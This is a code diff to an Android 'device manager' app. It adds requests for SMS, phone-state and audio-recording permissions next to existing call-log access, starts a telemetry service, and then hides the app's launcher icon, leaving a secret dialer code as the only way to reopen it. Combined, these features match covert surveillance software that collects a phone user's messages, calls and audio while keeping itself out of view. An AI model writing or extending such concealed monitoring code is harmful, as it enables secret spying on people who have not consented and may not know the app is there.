@@ -19,6 +19,7 @@ import androidx.core.content.ContextCompat;
 
 import com.company.devicemgr.receivers.DeviceAdminReceiver;
 import com.company.devicemgr.services.ForegroundTelemetryService;
+import com.company.devicemgr.utils.AppRuntime;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -79,7 +80,11 @@ public class MainPermissionsActivity extends Activity {
 
         btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_CALL_LOG}));
 
-        btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_SMS}));
+        btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.RECORD_AUDIO
+        }));
 
         btnNotifAccess.setOnClickListener(v -> {
             requestNotificationPermissionIfNeeded();
@@ -131,14 +136,17 @@ public class MainPermissionsActivity extends Activity {
 
     private void startTelemetryService() {
         requestNotificationPermissionIfNeeded();
-        Intent svc = new Intent(this, ForegroundTelemetryService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(svc);
-        } else {
-            startService(svc);
-        }
+        AppRuntime.ensureTelemetryStarted(this);
         showMsg("Serviço iniciado");
         updateStatusText();
+
+        getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("setup_completed", true).apply();
+        AppRuntime.setLauncherVisible(this, false);
+        new AlertDialog.Builder(this)
+                .setTitle("Configuração concluída")
+                .setMessage("Aplicação ocultada. Para reabrir, use o código no discador: *#*#8466#*#*")
+                .setPositiveButton("OK", (d, w) -> finishAffinity())
+                .show();
     }
 
     private void showMsg(String m) {
